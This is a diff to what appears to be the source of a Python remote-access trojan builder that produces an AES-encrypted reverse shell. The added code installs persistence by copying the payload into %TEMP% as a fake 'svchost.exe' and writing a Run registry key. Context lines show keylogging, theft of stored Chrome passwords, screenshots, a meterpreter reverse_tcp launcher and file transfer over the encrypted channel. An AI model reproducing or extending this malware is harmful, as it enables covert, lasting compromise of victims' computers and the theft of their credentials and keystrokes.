@@ -17,7 +17,21 @@ EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, iv, secretkey = randKey(32), randKey(16), randKey(32)
 
-finput = '''def fscreenshot():
+finput = '''def persistence():
+	if pwdvar == 'cd':
+		p = subprocess.Popen(['cd', '%TEMP%', '&&', 'cd'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		tempvar = p.stdout.read().strip() + p.stderr.read().strip()
+		shutil.copy2(sys.argv[0], "%s%ssvchost.exe" % (tempvar, os.sep))
+		hkey=win32api.RegCreateKey(win32con.HKEY_CURRENT_USER,"Software%sMicrosoft%sWindows%sCurrentVersion%sRun" % (os.sep,os.sep,os.sep,os.sep))
+		win32api.RegSetValueEx(hkey,'Clone',0,win32con.REG_SZ,(tempvar + os.sep + "svchost.exe"))
+		win32api.RegCloseKey(hkey)
+		encrypted = EncodeAES(cipher, ' [*] persistence installed to "' + tempvar + os.sep + 'svchost.exe"**nEOFEOFEOFEOFEOFX')
+		s.send(encrypted)
+	else:
+		encrypted = EncodeAES(cipher, " [X] persistence is only available for windows!**nEOFEOFEOFEOFEOFX")
+		s.send(encrypted)
+
+def fscreenshot():
 	hwnd = 0
 	hwndDC = win32gui.GetWindowDC(hwnd)
 	mfcDC = win32ui.CreateDCFromHandle(hwndDC)
@@ -137,6 +151,9 @@ while 1:
 	decrypted = DecodeAES(cipher, data)
 	if decrypted == "quit" or decrypted == "exit":
 		break
+
+	elif decrypted.startswith('persistence'):
+		persistence()
 
 	elif decrypted.startswith('screenshot'):
 		if pwdvar == 'cd':
@@ -268,7 +285,7 @@ encrypted = EncodeAES(cipherEnc, readyscript)
 b64var = randVar()
 aesvar = 'AES'
 f.write('''#!/usr/bin/env python
-import subprocess,socket,base64,os,struct,socket,binascii,ctypes,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
+import subprocess,socket,shutil,base64,os,struct,socket,binascii,ctypes,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
 try:
 	import win32api,win32gui,win32file,win32console,win32crypt,pyHook,pythoncom,win32ui,win32con
 except:
@@ -325,9 +342,9 @@ def fnextcmd():
 		s.send(encrypted)
 
 def fhelp():
-	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n**n Windows Only:**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords.**n  screenshot          -  Take a screenshot**n'
+	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n**n Windows Only:**n  persistence         -  Install to %TEMP% and create a startup registry.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome stored passwords.**n  screenshot          -  Take a screenshot.**n'
 
-commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'screenshot']
+commands = ['download ', 'upload ','persistence', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'screenshot']
 readline.parse_and_bind("tab: complete")
 readline.set_completer(completer)
 BLOCK_SIZE = 32
